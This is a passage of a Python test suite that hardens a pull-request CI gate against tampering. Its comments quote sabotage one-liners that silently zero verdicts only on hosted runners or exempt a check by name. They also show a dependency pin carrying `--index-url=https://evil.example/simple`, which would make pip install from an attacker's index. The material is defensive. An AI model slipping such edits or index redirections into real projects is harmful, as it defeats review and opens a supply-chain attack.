# everything before it, so `["python", s]` → `["python", "-c", "pass", s]` still ends in the suite path
# while running nothing at all: pass, for every suite, in the shape the comparison was written to accept.
# The property is that the resolver runs the argv the check declares — every word admitted by
# CMD_WORDS, PER_CHECK_EXTRA_WORDS for that specific check, or claimed as a path by the check
# itself, and one command per claimed suite.
for spec in list(pr_gate.CHECKS):
    built = []
    # `resolve()` closes over its argv and calls one of the two runners; intercepting both is the only
    # way to see what it would run without running thirteen suites here.
    reals = pr_gate.run, pr_gate.run_sequence
    try:
        pr_gate.run = lambda cmd: built.append(list(cmd)) or (0, "", 0.0)
        pr_gate.run_sequence = lambda cmds: [built.append(list(c)) for c in cmds] and (0, "", 0.0)
        pr_gate.resolve(spec)()
    finally:
        pr_gate.run, pr_gate.run_sequence = reals
    claimed = suites_of(spec)
    ran = [w for c in built for w in c if w in set(claimed)]
    stowaways = sorted({w for c in built for w in c
                        if w not in CMD_WORDS and w not in set(claimed)
                        and w not in PER_CHECK_EXTRA_WORDS.get(spec["name"], set())
                        and not w.startswith(("tests/", "scripts/")) and w != sys.executable})
    check(f"{spec['name']}'s resolver runs a command for each of its {len(claimed)} claimed suite(s), "
          f"so it cannot run a slice of them while the claim still covers all",
          sorted(ran) == sorted(claimed), (built, claimed))
    check(f"and every word of the argv it builds is one CMD_WORDS admits or a path {spec['name']} "
          f"claims — a resolver may not pad an argv into a no-op that still ends in the suite path",
          not stowaways, stowaways)

# Every rule in this file runs the gate *locally*. That is the one structural blind spot a local guard
# suite has, and it is wide enough to drive through: a predicate keyed on the environment behaves one
# way here and another way in Actions, so the suite can be green about code that never does in CI what
# it does on a laptop. Three separate one-liners exploited it — `if code and os.environ["RUNNER_OS"]:
# code = 0` (zeroes every verdict, since Actions always sets it), and `changed_files()` returning `[]`
# under `GITHUB_ACTIONS` or `CI` (selects nothing, prints "All selected gating checks passed"). All
# three passed 503/503, and no fixture could have caught them, because the fixture is the laptop.
#
# So the property is not "these particular variables are not read" — enumerating the runner's variables
# is the losing game — it is that the gate's behaviour does not depend on the environment at all.
# `FOUNDATIONS_REPO_ROOT` is the one exception, and it is read by a *check*, not by the gate.
gate_src = pathlib.Path(pr_gate.__file__).read_text()

# The guard suite reads the workflow's `python -m pip install ${reqs}` and pins every word of it. But
# `${reqs}` is the *stdout of this script*, interpolated unquoted under `set -f` precisely so it
# word-splits — so every token the generator emits becomes its own pip argv word, and none of the
# payload rules ever looked at it. One token added to `CO_REQUIRES` or `PINS`:
#
#     CO_REQUIRES = {"cumulusci": ["--index-url=https://evil.example/simple", "setuptools>=…"]}
#     PINS = {"cumulusci": "cumulusci==4.8.1 --extra-index-url https://evil.example/simple"}
#
# and pip installs from an arbitrary index, in CI, before any check runs — while the workflow text is
# untouched and the suite reports 503/503. It is the same hole round 19 closed on the YAML side,
# reached through the generator instead, which is the general lesson: pinning the consumer of a
# generated value proves nothing about the value.
#
# Requirement specifiers only: a leading `-` is an option, whitespace inside a token is a second
# argument smuggled through one dict value, and a URL is an index or a direct reference. PEP 508 allows
# far more than this repo needs; the point is not to parse it but to refuse anything that is not a
# name, an extra, and a version constraint.
emitted = [ln for ln in run_gate("--requirements", "--all")[1].splitlines() if ln.strip()]
check("the generated install payload is non-empty, so the rules below are not vacuous",
      len(emitted) >= 5, emitted)
# Under the other selector too, because the rules below read one and the workflow passes the other.
# `--requirements` is emitted under `--base "origin/${BASE_REF}"` in CI and under `--all` here, so
# `if not args.all: emitted.insert(0, "--index-url=…")` re-points pip on every PR while satisfying every
# assertion in this section. The payload is a function of *which checks are selected*, so the comparison
# has to select all of them the other way round — a path-driven selection, which is what CI does.
with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
    # `triggers[0]` twice on a list the shape rule allows to be empty; floored for the same reason as
    # the per-check loop below.
    fh.write("\n".join(sorted({t.rstrip("/") + "/probe.md" if t.endswith("/") else t
                               for c in pr_gate.CHECKS
                               for t in (c["triggers"] or ["_no_trigger_declared/"])[:1]})))
    selection_list = fh.name
emitted_paths = [ln for ln in run_gate("--requirements", "--changed-files-from", selection_list)[1]
                 .splitlines() if ln.strip()]
os.unlink(selection_list)
check("and is the same payload when the same checks are selected by path rather than by --all — the "
      "rules here read --all, so a payload conditional on the selector would be checked in one form "
      "and shipped in the other",
      set(emitted_paths) <= set(emitted) and len(emitted_paths) >= 5, (emitted, emitted_paths))
emitted = emitted + emitted_paths
bad_tokens = [tok for tok in emitted
              # A distribution name may start with a digit (`2to3`, `4Suite`), and PEP 508 allows it, so
              # anchoring on a letter would refuse a legitimate pin as if it were an option.
              if not re.fullmatch(r"[A-Za-z0-9][A-Za-z0-9._-]*(\[[A-Za-z0-9,._-]+\])?"
                                  r"((==|>=|<=|~=|!=|<|>)[A-Za-z0-9.*+!-]+(,\s*)?)*", tok.strip())
              or tok != tok.strip() or " " in tok.strip()]
check("every token it emits is a bare requirement specifier — no option, no URL, no second argument "
      "smuggled inside one PINS/CO_REQUIRES value, because each token becomes its own pip argv word",
      not bad_tokens, bad_tokens)
check("and no emitted token can re-point pip at another index or a local path",
      not [t for t in emitted if "://" in t or t.strip().startswith(("-", ".", "/", "@"))], emitted)

ENV_READS_OK = set()
# Read from the parse tree, not from the text. The text version matched `os.environ`/`os.getenv` and so
# was one import statement away from being silent: `from os import environ` at the top, `environ.get(…)`
# at the point of use, and the gate returns an empty selection in CI while this rule sees nothing.
# `os.environ` is the *spelling* of the thing being forbidden, not the thing itself — the thing is any
# reference to the process environment, and the tree names it however it is imported.
ENV_ATTRS = {"environ", "getenv", "putenv", "environb", "unsetenv"}
gate_tree = ast.parse(gate_src)
env_nodes = []
for node in ast.walk(gate_tree):
    if isinstance(node, ast.Attribute) and node.attr in ENV_ATTRS:
        env_nodes.append(node)
    elif isinstance(node, ast.Name) and node.id in ENV_ATTRS:
        env_nodes.append(node)
    elif isinstance(node, ast.ImportFrom) and node.module == "os":
        env_nodes += [a for a in node.names if a.name in ENV_ATTRS]
# Two escape hatches, because one of them cannot express every legitimate read. `ENV_READS_OK` names the
# *variables* a read is allowed to name, which works for `os.environ["X"]` and not at all for
# `os.environ.copy()` — a read with no literal in it, whose harvested set is empty, so the only way to
# permit it would be to delete the rule. `ENV_SPELLINGS_OK` allows an exact expression instead.
ENV_SPELLINGS_OK = set()
unallowed = []
for node in env_nodes:
    if isinstance(node, ast.alias):
        unallowed.append(f"line ?: from os import {node.name}")
        continue
    segment = ast.get_source_segment(gate_src, node) or ""
    named = {c.value for c in ast.walk(node)
             if isinstance(c, ast.Constant) and isinstance(c.value, str)}
    if segment in ENV_SPELLINGS_OK or (named and not (named - ENV_READS_OK)):
        continue
    unallowed.append(f"line {node.lineno}: {segment or ast.dump(node)[:60]}")
check("the gate reads no environment variable under any spelling — attribute, bare name, or `from os "
      "import environ` — so it cannot behave one way locally and another in Actions (allow one by "
      "naming the variable in ENV_READS_OK, or the expression in ENV_SPELLINGS_OK when it names no "
      "variable, and only with a reason a CI-only behaviour change is acceptable)",
      not unallowed, sorted(unallowed))

# `sys.argv` is the other input that differs between the two populations, and it differs for free: the
# workflow invokes `python scripts/ai/pr_gate.py`, every fixture here imports the module. So
# `os.path.basename(sys.argv[0]) != "pr_gate.py"` is an if-in-CI with no environment read in it. argparse
# is the one legitimate reader, in main(); anywhere else it is a CI detector.
main_lines = range(*(lambda f: (f.lineno, max(getattr(n, "lineno", f.lineno)
                                             for n in ast.walk(f)) + 1))(
    next(f for f in gate_tree.body if isinstance(f, ast.FunctionDef) and f.name == "main")))
argv_reads = sorted({node.lineno for node in ast.walk(gate_tree)
                     if isinstance(node, ast.Attribute) and node.attr == "argv"
                     and node.lineno not in main_lines})
check("and reads sys.argv only inside main(), where argparse consumes it — read anywhere else it is a "
      "CI detector that needs no environment variable, because the workflow runs this file by path and "
      "every fixture here imports it",
      not argv_reads, argv_reads)

# No absolute path literal, for the same reason: `os.path.isdir("/opt/hostedtoolcache")` is true on a
# GitHub runner and false everywhere else. The gate's own paths are all derived from `__file__`.
abs_literals = sorted({node.value for node in ast.walk(gate_tree)
                       if isinstance(node, ast.Constant) and isinstance(node.value, str)
                       and node.value.startswith("/") and len(node.value) > 1})
check("and contains no absolute-path literal, the remaining way to ask 'am I on a hosted runner' "
      "without reading a variable — every path the gate uses is derived from __file__",
      not abs_literals, abs_literals)

# The other way a verdict disappears between producing it and reporting it: exempt one check by name.
# `if check["name"] != "pr_gate_suite": failures.append(...)` still prints `[FAIL] pr_gate_suite` — the
# log looks correct — but `main()` returns non-zero only from `failures`, so a PR whose one red check is
# this suite exits 0, and every guard in this file becomes unenforceable at once. The argv spelling
# (`if any(a.endswith("tests/test_pr_gate.py") for a in argv): code = 0` inside `run()`) is the same
# move keyed on a path instead of a name. Both are refused by the same property: the machinery that
# runs a check and books its result must not mention any individual check.
# Scoped to `run()` and the booking loop, and *not* to `resolve()` between them, which names two
# checks legitimately (they are the ones whose argv it builds). The first version of this rule swept
# from `def run(` to `def main(`, caught `resolve()`, and reported those two as violations — a rule
# whose region is wrong accuses correct code, which is how it gets deleted rather than narrowed.
# The region used to stop at `width = max(` — the end of the *loop*. `main()`'s return is the other
# half of the accounting, and an exemption spelled there (`if [f for f in failures if f != "…"]:`)
# prints the FAIL banner and exits 0. Reading to the end of the function covers both halves.
plumbing = (body_of(gate_src, "def run(", "the command runner")
            + body_of(gate_src, "def run_sequence(", "the sequence runner")
            + gate_src.split("results, failures, advisory_failures")[-1])
named_in_plumbing = sorted({n for n in names if f'"{n}"' in plumbing or f"'{n}'" in plumbing})
check("no check is named inside run(), run_sequence() or the booking loop, so no single check's "
      "failure can be booked differently from the rest",
      not named_in_plumbing, named_in_plumbing)
suite_paths = sorted({s for c in pr_gate.CHECKS for s in suites_of(c)})
pathed_in_plumbing = sorted({s for s in suite_paths if s in plumbing})
check("and no suite path is named there either, which is the same exemption keyed on argv rather "
      "than on the check's name",
      not pathed_in_plumbing, pathed_in_plumbing)
# Behavioural, because a rule about source text is only as good as the region it reads: a *failing*
# gating check has to reach the FAILED line and a non-zero exit, whatever its name. Driven in-process
# over a one-check `CHECKS`, and deliberately not by shelling out with a real selector — the first
# version of this rule wrote a probe suite into `tests/`, which selection then saw as an untracked
# change to `tests/`, which selected this very suite, which ran it again. The recursion took five
# minutes to notice and is a good argument for keeping fixtures out of paths the gate watches.
probe_fail = dict(name="zz_probe_gating_failure", cmd=["python", "-c", "import sys; sys.exit(1)"],
                  triggers=["tests/"], deps=[], gating=True, note="probe")
real_checks, real_changed, real_argv = pr_gate.CHECKS, pr_gate.changed_files, sys.argv
buf = io.StringIO()
try:
    pr_gate.CHECKS = [probe_fail]
    pr_gate.changed_files = lambda base: ["tests/probe.py"]
    sys.argv = ["pr_gate.py", "--base", "HEAD"]
    with redirect_stdout(buf):
        rc = pr_gate.main()
finally:
    pr_gate.CHECKS, pr_gate.changed_files, sys.argv = real_checks, real_changed, real_argv
printed = buf.getvalue()
check("a failing gating check reaches the FAILED line and a non-zero exit, so a verdict cannot be "
      "printed and then dropped from the accounting",
      rc == 1 and "zz_probe_gating_failure" in printed.split("FAILED:")[-1],
      (rc, printed[-300:]))

# The rules above are generic — one synthetic check, and a source scan over the plumbing. Neither can
# see a predicate keyed on a *particular* check's name, and three of those live outside the region the
# scan reads: the selection comprehension (`… and c["name"] != "pr_gate_suite"`), the `--all` branch,
# and the exit test (`if [f for f in failures if f != "pr_gate_suite"]:`, which prints the FAIL banner
# and then reports success anyway). All three passed 517/517.
#
# Which check gets exempted is what makes this severe: `pr_gate_suite` runs *this file*, and its
# triggers include `scripts/ai/` and `tests/`, so the PR that adds the exemption selects the suite that
# would catch it. Asserted per check instead of generically — for every entry in `CHECKS`, a file under
# its own first trigger must select it, and with every runner stubbed to fail, its name must reach the
# failure accounting and turn the gate red.
real_run, real_seq, real_git = pr_gate.run, pr_gate.run_sequence, pr_gate.git
real_changed, real_argv, real_deps = pr_gate.changed_files, sys.argv, pr_gate.missing_deps
real_unlisted = pr_gate.unlisted_suites


def gate_verdict(probe, failing):
    """Run `main()` in-process for one changed path, with only `failing`'s runner returning 1.

    Failing *every* runner, as the first version of this did, hides an exemption applied at main()'s
    return (`if [f for f in failures if f != "…"]`): the other checks selected by the same probe keep the
    filtered list non-empty, so the gate still exits 1 and the rule passes. One failure at a time is what
    makes the exit code an assertion about the check under probe.
    """
    # Identified by the *paths* in the check's argv — its declared script, plus the suites `resolve()`
    # splices in for a bulk check, whose `cmd` is None and so offers no argv to match on. Keying this on
    # `suites_of()` alone silently exempted the four checks that run a script rather than a suite
    # (`agent_tooling`, `skill_manifest`, `plan_readme_consistency`, `sfdmu_datasets`): their owned set was
    # empty, nothing failed, and the rule reported them unbooked instead of asserting anything.
    owned = ({str(w) for w in (failing["cmd"] or ()) if "/" in str(w)}
             | set(suites_of(failing))) or {failing["name"]}

    def fails(cmd):
        return 1 if owned & {str(w) for w in cmd} else 0

    buf = io.StringIO()
    try:
        pr_gate.run = lambda cmd: (fails(cmd), "stubbed", 0.0)
        pr_gate.run_sequence = lambda cmds: (max(fails(c) for c in cmds), "stubbed", 0.0)
        pr_gate.git = lambda argv, what: " M x\n"
        pr_gate.changed_files = lambda base, _p=probe: [_p]
        # Dependency detection stubbed too, or this rule proves something different on every machine.
        # `missing_deps` probes the real interpreter, and a check blocked on a missing dependency is
        # booked *before* its runner is reached — so on an interpreter without pytest, PyYAML, textual
        # or cumulusci, six of the fourteen checks were asserted through the MISSING-DEP path while the
        # message claimed the run path, and the stubbed runner never ran at all. Which six varied with
        # the machine, so a maintainer's local green proved less than CI's. Same shape as the four
        # misattributed kills recorded in the README: the assertion passed for a reason other than the
        # one it names.
        pr_gate.missing_deps = lambda check: []
        sys.argv = ["pr_gate.py", "--base", "HEAD"]
        with redirect_stdout(buf):
            rc = pr_gate.main()
    finally:
        pr_gate.run, pr_gate.run_sequence, pr_gate.git = real_run, real_seq, real_git
        pr_gate.changed_files, sys.argv = real_changed, real_argv
        pr_gate.missing_deps = real_deps
    return rc, buf.getvalue()


def probe_path(trig, ext=".md"):
    return trig.rstrip("/") + "/probe_reaches_verdict" + ext if trig.endswith("/") else trig


def gate_verdict_all(runner_code, only=None, checks=None):
    """Run `main()` with every selected runner returning `runner_code`, and report the exit code.

    Distinct from `gate_verdict` above, which fails one runner at a time to make the exit code an
    assertion about a single check's *booking*. This asks the other question — what the gate's exit code
    means — which needs the outcome uniform. `only` narrows the selection; `checks` replaces it outright,
    for a synthetic check no live `CHECKS` entry can stand in for.
    """
    buf = io.StringIO()
    keep = [c for c in (checks if checks is not None else pr_gate.CHECKS) if only is None or only(c)]
    try:
        pr_gate.run = lambda cmd: (runner_code, f"stub exit {runner_code}", 0.1)
        pr_gate.run_sequence = lambda cmds: (runner_code, f"stub exit {runner_code}", 0.1)
        pr_gate.missing_deps = lambda check: []
        pr_gate.unlisted_suites = lambda: []
        pr_gate.CHECKS = keep
        pr_gate.changed_files = lambda base: [probe_path((c["triggers"] or ["x/"])[0])
                                              for c in keep]
        sys.argv = ["pr_gate.py", "--base", "HEAD"]
        with redirect_stdout(buf):
            rc = pr_gate.main()
    finally:
        pr_gate.run, pr_gate.run_sequence = real_run, real_seq
        pr_gate.changed_files, sys.argv = real_changed, real_argv
        pr_gate.missing_deps, pr_gate.unlisted_suites = real_deps, real_unlisted
        pr_gate.CHECKS = real_checks
    return rc, buf.getvalue()


for spec in list(pr_gate.CHECKS):
    # `triggers[0]` on an empty list is an IndexError here, and this loop sits above the count
    # invariant — the shape rule near the top of the file reports `triggers=[]` and the backfill makes
    # it `[]` rather than absent, so the subscript still needs a floor. A path no check claims selects
    # nothing, which is the honest outcome: the check under probe is reported unbooked.
    probe = probe_path((spec["triggers"] or ["_no_trigger_declared/"])[0])
    rc, printed = gate_verdict(probe, spec)
    def listed(marker):
        # `split(marker)[-1]` returns the *whole* string when the marker is absent, so an absent
        # `FAILED:` line read as "every name is in the failure list" — which passed under an interpreter
        # missing an optional dependency (some check was blocked, so the line existed) and failed under
        # one where nothing was blocked. Same class as `body_of`: an unanchored split is not a section.
        return printed.split(marker)[1] if marker in printed else ""

    if spec["gating"]:
        # Booked in the gating list *and* reflected in the exit code. Both halves matter: an exemption
        # applied at main()'s return prints the name and exits 0.
        booked = spec["name"] in listed("FAILED:") and rc == 1
    else:
        # An advisory failure is booked in its own list and must *not* reach the gating one. The exit code
        # is not asserted here: under an interpreter missing an optional dependency, a gating check is
        # blocked and the gate is red for that reason, which says nothing about this check.
        booked = (spec["name"] in listed("advisory failure(s):")
                  and spec["name"] not in listed("FAILED:"))
    check(f"a failing {spec['name']} is booked as a {'failure' if spec['gating'] else 'advisory'} when "
          f"{probe} changes, so it cannot be exempted by name, index or helper from selection, the run, "
          f"the accounting or the exit test",
          booked, (rc, printed[-260:]))

# Selection fidelity, end to end. Every rule above reads either `changed_files()` or `selects()`; none
# reads what `main()` does with the list *between* them, and a comprehension there
# (`selects(c, [f for f in files if not f.startswith(".github/")])`) excludes a whole tree with both
# functions untouched. A suffix filter in `changed_files()` itself does the same for the largest class of
# change in this repo — `if not f.endswith(".csv")` hides every dataset edit — and the per-trigger probe
# above cannot see it, because a probe path chooses its own extension.
#
# So: one run of `main()` over a list carrying a path per trigger *at every extension that trigger's
# tree actually contains*, asserting that all of CHECKS is selected. Anything dropped anywhere on the
# path from the changed-file list to the selected list shows up as a check that was skipped.
exts_by_trigger = {}
for spec in pr_gate.CHECKS:
    for trig in spec["triggers"]:
        if not trig.endswith("/"):
            exts_by_trigger.setdefault(trig, {""})
            continue
        found = {p.suffix for p in pathlib.Path(REPO, trig).rglob("*") if p.is_file() and p.suffix}
        exts_by_trigger.setdefault(trig, set()).update(found or {".md"})
every_tree = sorted({probe_path(t, e) for t, es in exts_by_trigger.items() for e in es})
check("the per-trigger fixture covers every extension present under every directory trigger, so a "
      "suffix filter has nowhere to hide", len(every_tree) >= len(exts_by_trigger), len(every_tree))
buf = io.StringIO()
try:
    pr_gate.run = lambda cmd: (0, "", 0.0)
    pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
    pr_gate.changed_files = lambda base: list(every_tree)
    sys.argv = ["pr_gate.py", "--base", "HEAD"]
    with redirect_stdout(buf):
        pr_gate.main()
finally:
    pr_gate.run, pr_gate.run_sequence = real_run, real_seq
    pr_gate.changed_files, sys.argv = real_changed, real_argv
selection_out = buf.getvalue()
skipped = sorted(n for n in names if re.search(rf"\[SKIPPED\s*\]\s+{re.escape(n)}\b", selection_out))
check("with one changed path under every trigger, main() selects every check — so nothing filters the "
      "changed-file list between changed_files() and selects()",
      not skipped and f"{len(pr_gate.CHECKS)} of {len(pr_gate.CHECKS)} checks selected" in selection_out,
      (skipped, selection_out[:200]))
# One trigger at a time as well, because the aggregate above cannot see a filter on a *tree* unless some
# check triggers on that tree alone. `.github/` is the case in point: the only check watching it also
# watches `scripts/ai/` and `tests/`, so excluding the whole tree still left every check selected and the
# aggregate green. Per trigger, the check that owns it has to be selected by that path by itself.
unselecting = []
for spec in pr_gate.CHECKS:
    for trig in spec["triggers"]:
        for ext in sorted(exts_by_trigger.get(trig, {""})):
            one = probe_path(trig, ext)
            buf = io.StringIO()
            try:
                pr_gate.run = lambda cmd: (0, "", 0.0)
                pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
                pr_gate.changed_files = lambda base, _p=one: [_p]
                sys.argv = ["pr_gate.py", "--base", "HEAD"]
                with redirect_stdout(buf):
                    pr_gate.main()
            finally:
                pr_gate.run, pr_gate.run_sequence = real_run, real_seq
                pr_gate.changed_files, sys.argv = real_changed, real_argv
            if re.search(rf"\[SKIPPED\s*\]\s+{re.escape(spec['name'])}\b", buf.getvalue()):
                unselecting.append(f"{one} does not select {spec['name']}")
check("and each trigger on its own selects the check that watches it, so no single tree or extension "
      "can be excluded between the changed-file list and the selected list",
      not unselecting, unselecting[:6])
# The same list under the base spelling CI actually passes. `--base origin/264` is what the workflow
# runs and `--base HEAD` is what every fixture here runs, so a predicate on the *value* of `--base`
# separates the two populations exactly the way an environment variable would.
buf = io.StringIO()
try:
    pr_gate.run = lambda cmd: (0, "", 0.0)
    pr_gate.run_sequence = lambda cmds: (0, "", 0.0)
    pr_gate.changed_files = lambda base: list(every_tree)
    sys.argv = ["pr_gate.py", "--base", "origin/264"]
    with redirect_stdout(buf):
        pr_gate.main()
finally:
    pr_gate.run, pr_gate.run_sequence = real_run, real_seq
    pr_gate.changed_files, sys.argv = real_changed, real_argv
check("and selects the same checks under a remote-tracking base, the spelling CI passes and no other "
      "fixture here uses",
      f"{len(pr_gate.CHECKS)} of {len(pr_gate.CHECKS)} checks selected" in buf.getvalue(),
      buf.getvalue()[:200])

# What the rules above still cannot see is a predicate that is *true only on a hosted runner* and reads
# no environment variable to find out: `if os.path.isdir("/opt/hostedtoolcache"): code = 0` zeroes every
# verdict in CI and changes nothing locally, so it passes every behavioural fixture in this file by
# construction. There is no local observation that refutes it. What there is instead is a small, fixed
# amount of source that is allowed to decide a verdict — so that region is pinned, and any edit to it
# fails until a reader has re-approved it deliberately.
#
# Whitespace-normalised and comment-stripped, so reformatting and commentary are free; the pin is over
# what executes. Same reasoning as EXPECTED: the value of a rule nobody can edit silently.
def fingerprint(text):
    lines = [ln.split("#")[0].rstrip() for ln in text.splitlines()]
    return hashlib.sha256(" ".join(" ".join(ln.split()) for ln in lines if ln.strip()).encode()
                          ).hexdigest()[:12]


VERDICT_REGIONS = {
    # region: (fingerprint, what it decides)
    "run()": ("0085e7acf27b", "the exit code, stdout and duration of one command"),
    "run_sequence()": ("00747f44b21e", "the first non-zero code across a sequence"),
    # Repinned in the wave that split tool errors out of failures: a runner returning 2 was booked as a
    # FAIL and exited 1, publishing a code verdict on a check that produced none. This rule is what
    # made that a deliberate edit rather than a quiet one, which is exactly its purpose.
    "the booking loop and main()'s return": ("a88508e61f7f", "which verdicts reach the exit code"),
}
observed = {
    "run()": fingerprint(body_of(gate_src, "def run(", "the command runner")),
    "run_sequence()": fingerprint(body_of(gate_src, "def run_sequence(", "the sequence runner")),
    "the booking loop and main()'s return":
        fingerprint(gate_src.split("results, failures, advisory_failures")[-1]),
}
for region, (pinned, decides) in VERDICT_REGIONS.items():
    check(f"{region} is unchanged — it decides {decides}, and a predicate there that is true only on a "
          f"hosted runner (a tool-cache path, a mounted volume) is invisible to every behavioural "
          f"fixture here, so this region changes only by updating VERDICT_REGIONS deliberately",
          observed[region] == pinned, f"observed {observed[region]}, pinned {pinned}")

print("\nCommand-line contract")
code, out = run_gate("--list")
check("--list exits 0", code == 0, code)
check("--list names every check", all(n in out for n in names))
code, out = run_gate("--base", "HEAD", "--all")
check("two selectors at once is a usage error (exit 2, never 1)", code == 2, code)
code, out = run_gate()
check("no selector is a usage error", code == 2, code)
code, out = run_gate("--requirements", "--all")
check("--requirements emits the pinned CumulusCI spec",
      "cumulusci==" in out, out.strip())
check("--requirements emits nothing unpinned for cumulusci",
      not re.search(r"^cumulusci$", out, re.M), out.strip())
# Installing exactly what --requirements prints has to leave the dependency importable.
# CumulusCI needs pkg_resources at import time, which a 3.12+ venv lacks until setuptools is
# installed — so omitting it here hands the caller a MISSING-DEP for a package it just
# installed, and pip's install order means the pin must come first.
req_lines = [ln for ln in out.splitlines() if ln.strip()]
check("--requirements pairs the CumulusCI pin with setuptools",
      any(ln.startswith("setuptools") for ln in req_lines), req_lines)
def first_line(prefix):
    """Index of the first requirement with this prefix, or None.

    Spelled as a bare `next()`, this raised StopIteration on exactly the input the check above had
    just reported as missing — the suite aborted instead of reporting the finding it had made.
    """
    return next((i for i, ln in enumerate(req_lines) if ln.startswith(prefix)), None)


setuptools_at, cumulusci_at = first_line("setuptools"), first_line("cumulusci")
check("...and emits setuptools before CumulusCI, the order pip installs in",
      setuptools_at is not None and cumulusci_at is not None and setuptools_at < cumulusci_at,
      req_lines)
code, out_nocci = run_gate("--requirements", "--changed-files-from", os.devnull)
check("a selection without CumulusCI does not drag setuptools in",
      "setuptools" not in out_nocci, out_nocci.strip())

# pyproject.toml carries [tool.pytest.ini_options], so it decides what the two pytest-invoking
# checks collect. If it selected nothing, a change that broke collection would merge without
# either suite running once.
pytest_driven = {c["name"] for c in pr_gate.CHECKS
                 if c["cmd"] and "pytest" in " ".join(c["cmd"])}
selected_by_pyproject = set(selected_names(["pyproject.toml"]))
check("pyproject.toml selects every pytest-driven check",
      pytest_driven and pytest_driven <= selected_by_pyproject,
      sorted(pytest_driven - selected_by_pyproject))
# This suite runs the gate, so its probe path must not select a check that runs this suite
# (infinite nesting) or one whose dependency CI would not have installed for the outer
# selection (a MISSING-DEP failure that says nothing about the gate).
# erd-data.json selects exactly one check, which needs no package and does not run this
# suite. It replaced .claude/skill-manifest.yml, which stopped qualifying once a manifest
# edit started (correctly) selecting the PyYAML-dependent suite that audits the manifest.
PROBE_PATH = "docs/erds/erd-data.json"
probe_selection = [c for c in pr_gate.CHECKS if pr_gate.selects(c, [PROBE_PATH])]
nesting_fixture = changed_list("tests/test_branch_scope.py")
try:
    main_with(["--changed-files-from", nesting_fixture])
    refused = False
except AssertionError:
    refused = True
finally:
    os.unlink(nesting_fixture)
check("a fixture that would nest the gate inside itself is refused, not run", refused,
      "pr_gate_suite triggers on tests/, so running it on a tests/ fixture recurses")
check("the probe path selects at least one check", probe_selection != [])
check("the probe path selects no check that re-runs this suite",
      all("tests/test_pr_gate.py" not in (c["cmd"] or []) for c in probe_selection)
      # cmd=None checks expand at runtime, so the command list alone is not enough: a
      # bulk-suite check would satisfy the test above while still re-running this file.
      and "tests/test_pr_gate.py" not in pr_gate.STDLIB_SUITES
      and not any(c["name"] == "stdlib_offline_suites" for c in probe_selection),
      [c["name"] for c in probe_selection])
check("the probe path needs no installed dependency",
      all(not c["deps"] for c in probe_selection),
      {c["name"]: c["deps"] for c in probe_selection})

with tempfile.NamedTemporaryFile("w", suffix=".txt", delete=False) as fh:
    fh.write(PROBE_PATH + "\n")
    changed = fh.name
try:
    code, out = run_gate("--changed-files-from", changed)
    check("a changed-file list runs the checks it selects and exits 0", code == 0, out[-400:])
    check("the report prints a line for every check",
          all(re.search(rf"\] {re.escape(n)}\b", out) for n in names),
          [n for n in names if not re.search(rf"\] {re.escape(n)}\b", out)])
    check("skipped checks say why they were skipped", "nothing it covers changed" in out)
    # Every check lands in exactly one bucket and the buckets sum to the total, so a reader
    # reconciling them never finds one unaccounted for.
    # The failure count is deliberately *not* in this pattern. It is not a bucket — it overlaps all
    # three and can also hold `unlisted_suites`, which is not a check — and pinning it here is what let
    # the wording drift into "0 blocked on a missing dependency, of which 1 failed": the regex was
    # updated to match the new phrasing, so the suite green-lit a sentence that contradicts itself.
    # Matching only the three that partition keeps this rule about the arithmetic it can actually check.
    buckets = re.search(r"(\d+) checks: (\d+) executed, (\d+) skipped, "
                        r"(\d+) blocked on a missing dependency\.", out)
    check("the summary reports every bucket separately", buckets is not None, out[-300:])
    check("the buckets account for every check",
          buckets and int(buckets.group(1)) == sum(int(buckets.group(i))
                                                  for i in (2, 3, 4)),
          buckets.groups() if buckets else None)
    check("and the failure count is reported as a cross-bucket count rather than a fourth bucket, so "
          "no reader can add four numbers and find one check too many — nor read 0 blocked, 1 failed "
          "as a contradiction",
          re.search(r"\d+ blocked on a missing dependency\. (Nothing failed\.|\d+ failed \(a count "
                    r"across those buckets, not a fourth one\))", out) is not None, out[-300:])
finally:
    os.unlink(changed)

# A dependency that is present on disk but cannot be imported must read as absent. This is
# not hypothetical: cumulusci 4.8.1 imports `fs`, which imports `pkg_resources`, which a
# Python 3.12+ venv lacks until setuptools is installed. find_spec called that install fine
# and the breakage surfaced as two unrelated-looking suite failures instead of one blocked
# dependency, so the probe has to be a real import.
with tempfile.TemporaryDirectory() as probe_dir:
    name = "zz_present_but_unimportable"
    pathlib.Path(probe_dir, name + ".py").write_text(
        "raise ModuleNotFoundError(\"No module named 'pretend_transitive_dep'\")\n")
    prior_path, prior_cache = sys.path[:], dict(pr_gate._IMPORTABLE)
    prior_env = os.environ.get("PYTHONPATH")
    sys.path.insert(0, probe_dir)
    os.environ["PYTHONPATH"] = probe_dir + os.pathsep + (prior_env or "")
    try:
        pr_gate._IMPORTABLE.clear()
        check("find_spec alone would call the broken dependency present",
              importlib.util.find_spec(name) is not None)
        check("a present-but-unimportable dependency reads as absent",
              pr_gate.have_module(name) is False)
        pr_gate._IMPORTABLE.clear()
        check("a genuinely importable dependency still reads as present",
              pr_gate.have_module("json") is True)
    finally:
        sys.path[:] = prior_path
        if prior_env is None:
            os.environ.pop("PYTHONPATH", None)
        else:
            os.environ["PYTHONPATH"] = prior_env
        pr_gate._IMPORTABLE.clear()
        pr_gate._IMPORTABLE.update(prior_cache)

# `.get()`, because both the assertion and its detail argument subscripted the dict — so removing the
# key raised KeyError instead of reporting a finding, and the detail is evaluated eagerly whether the
# check passes or not.
check("cumulusci is probed at the depth a task actually needs",
      pr_gate.DEPS.get("cumulusci") == "cumulusci.core.tasks", pr_gate.DEPS.get("cumulusci"))

# A failed `git status` returns empty stdout, which reads exactly like a clean tree. In
# changed_files that would silently drop every uncommitted path from the selection; in the
# CCI-reference check, where the status IS the verdict, it would report "no drift" and pass.
# Both must fail loudly instead, so both return codes are asserted here.
source = pathlib.Path(pr_gate.__file__).read_text()
status_calls = source.count('"status", "--porcelain"')
check("both git status call sites are still present", status_calls == 2, status_calls)

# The selection is only as honest as the diff it reads, and a pathspec is invisible in every result
# the gate prints. `git diff … -- ":!tests/"` reports a clean tests/ tree, so every edit to a suite —
# including edits to this file — selects nothing and the gate passes having chosen to look away.
# Pinned as the whole argv, because the danger is an *added* argument and no list of the arguments
# that must not appear can be complete.
